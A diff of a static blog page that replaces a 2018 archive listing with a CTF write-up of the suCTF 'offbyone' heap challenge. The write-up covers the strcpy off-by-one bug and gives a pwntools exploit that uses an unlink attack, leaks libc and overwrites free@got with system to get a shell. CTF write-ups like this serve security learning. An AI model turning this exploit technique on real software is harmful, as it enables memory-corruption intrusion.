@@ -7,15 +7,20 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <meta name="baidu-site-verification" content="RNCre9JfIO" />
   <link rel="dns-prefetch" href="https://sunichi.github.io">
-  <title>Archives: 2018 | Sunichi&#39;s Blog</title>
+  <title>suCTF pwn heap(offbyone) writeup | Sunichi&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Sunichi&#39;s Blog">
-<meta property="og:url" content="https://sunichi.github.io/archives/2018/page/2/index.html">
+  <meta name="description" content="Checksec： 12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000) This pwn exists off-by-one:">
+<meta name="keywords" content="ctf,pwn,heap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="suCTF pwn heap(offbyone) writeup">
+<meta property="og:url" content="https://sunichi.github.io/2018/07/07/suctf18-pwn-heap(offbyone)/index.html">
 <meta property="og:site_name" content="Sunichi&#39;s Blog">
+<meta property="og:description" content="Checksec： 12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000) This pwn exists off-by-one:">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-07-07T09:18:08.936Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Sunichi&#39;s Blog">
+<meta name="twitter:title" content="suCTF pwn heap(offbyone) writeup">
+<meta name="twitter:description" content="Checksec： 12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000) This pwn exists off-by-one:">
   
     <link rel="alternative" href="/atom.xml" title="Sunichi&#39;s Blog" type="application/atom+xml">
   
@@ -149,36 +154,74 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-suctf18-pwn-heap(offbyone)" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      suCTF pwn heap(offbyone) writeup
+    </h1>
+  
+
+        
+        <a href="/2018/07/07/suctf18-pwn-heap(offbyone)/" class="archive-article-date">
+  	<time datetime="2018-07-07T08:55:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-07</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Checksec：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>This pwn exists off-by-one:</p>
+<a id="more"></a>
+<p>When pwner wants to get a new chunk, the program will <code>malloc()</code> two same size chunk. The pwner’s input will be put into the first chunk, and then the program uses <code>strcpy()</code> without input size to do the memory copy. The first chunk will be <code>free()</code> very soon.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( size &gt; <span class="number">0x7F</span> &amp;&amp; size &lt;= <span class="number">0x100</span> )</span><br><span class="line">&#123;</span><br><span class="line">  fake_new_chunk = <span class="built_in">malloc</span>(size);</span><br><span class="line">  new_chunk = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="built_in">memset</span>(new_chunk, <span class="number">0</span>, size);</span><br><span class="line">  <span class="built_in">memset</span>(fake_new_chunk, <span class="number">0</span>, size);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input your data"</span>);</span><br><span class="line">  read(<span class="number">0</span>, fake_new_chunk, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)new_chunk, (<span class="keyword">const</span> <span class="keyword">char</span> *)fake_new_chunk);</span><br><span class="line">  ++total;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; total; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !heap_form[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      heap_form[i] = (<span class="keyword">char</span> *)new_chunk;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i == total )</span><br><span class="line">    heap_form[i] = (<span class="keyword">char</span> *)new_chunk;</span><br><span class="line">  <span class="built_in">free</span>(fake_new_chunk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>If pwner doesn’t enter \x00 to end the string, the next chunk’s size will be regarded as a part of the string. Here exists off-by-one.</p>
+<p>We first <code>malloc()</code> 5 chunks, chunk 1-4 will reuse the first chunk’s fake_new_chunk to do the string copy. Chunk 1 will be used to get shell by <code>system()</code>.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    p = process(<span class="string">'./offbyone'</span>)</span><br><span class="line">    elf = ELF(<span class="string">'./offbyone'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">	<span class="comment"># chunk size 0x80 ~ 0x100</span></span><br><span class="line">    Add(p, <span class="number">0x100</span>, <span class="string">'0'</span> * <span class="number">0x100</span>)</span><br><span class="line">    Add(p, <span class="number">0x100</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    Add(p, <span class="number">0x100</span>, <span class="string">'2'</span> * <span class="number">0x100</span>)</span><br><span class="line">    Add(p, <span class="number">0x88</span>, <span class="string">'3'</span> * <span class="number">0x88</span>)</span><br><span class="line">    Add(p, <span class="number">0x100</span>, <span class="string">'4'</span> * <span class="number">0x100</span>)</span><br></pre></td></tr></table></figure>
+<p>Construct a fake chunk of size 0x80 and set chunk 4 pre_inuse to 0 then perform the unlink attack.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="number">2</span> * p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x6020d8</span> - <span class="number">0x18</span>) + p64(<span class="number">0x6020d8</span> - <span class="number">0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(<span class="number">0x80</span>) + <span class="string">'\x10'</span></span><br><span class="line">Edit(p, <span class="number">3</span>, payload)</span><br><span class="line">Delete(p, <span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+<p>When we <code>free()</code> the chunk 4, it will merge the fake chunk 3 of size 0x80 instead of 0x90. The unlink attack detail:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FD = <span class="number">0x6020c0</span>;</span><br><span class="line">BK = <span class="number">0x6020c8</span>;</span><br><span class="line"><span class="comment">// will pass the security check</span></span><br><span class="line">FD-&gt;bk = BK; <span class="comment">// *(0x6020d8) = 0x6020c8</span></span><br><span class="line">BK-&gt;fd = FD; <span class="comment">// *(0x6020d8) = 0x6020c0</span></span><br></pre></td></tr></table></figure>
+<p>After unlink, the chunk_list[3] will point to the chunk_list[0]’s address and we will have the ability to write and read arbitrarily. Then leak the libc address and get the shell by overwrite the <code>free@got</code>.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Edit(p, <span class="number">3</span>, p64(elf.got[<span class="string">'malloc'</span>]))</span><br><span class="line">libc_base_addr = Show(p, <span class="number">0</span>)</span><br><span class="line">libc_base_addr = u64(libc_base_addr.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - libc.symbols[<span class="string">'malloc'</span>]</span><br><span class="line">libc.address = libc_base_addr</span><br><span class="line"></span><br><span class="line">Edit(p, <span class="number">3</span>, p64(elf.got[<span class="string">'free'</span>]))</span><br><span class="line">Edit(p, <span class="number">0</span>, p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">Delete(p, <span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+<p><br></p>
+<blockquote>
+<h5 id="Relevant-Article"><a href="#Relevant-Article" class="headerlink" title="Relevant Article"></a>Relevant Article</h5><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/unlink/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/heap/unlink/</a></p>
+</blockquote>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/02/02/cyberearth-xctf-pwn-stack/" class="archive-article-date">
-  	<time datetime="2018-02-02T06:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-02-02</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/02/02/cyberearth-xctf-pwn-stack/">cyberearth xctf pwn stack writeup</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -190,194 +233,113 @@
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
         		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/01/09/rctf15-welpwn/" class="archive-article-date">
-  	<time datetime="2018-01-09T00:55:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-09</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/01/09/rctf15-welpwn/">rctf2015 welpwn writeup</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">heap</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://sunichi.github.io/2018/07/07/suctf18-pwn-heap(offbyone)/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/01/07/lctf16-pwn100/" class="archive-article-date">
-  	<time datetime="2018-01-07T03:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-07</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2018/07/03/hitcon16-houseoforange/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">hitcon 2016 houseoforange writeup</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/01/07/lctf16-pwn100/">lctf15 pwn100 writeup</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/01/06/xdctf15-pwn200/" class="archive-article-date">
-  	<time datetime="2018-01-06T09:13:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-06</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/01/06/xdctf15-pwn200/">xdctf15 pwn200 writeup</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/01/05/pwnable-tw-start/" class="archive-article-date">
-  	<time datetime="2018-01-05T10:33:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-05</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/01/05/pwnable-tw-start/">Pwnable.tw start writeup</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/2018/">&laquo; Prev</a><a class="page-number" href="/archives/2018/">1</a><span class="page-number current">2</span>
-    </nav>
   
 
 
@@ -401,8 +363,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
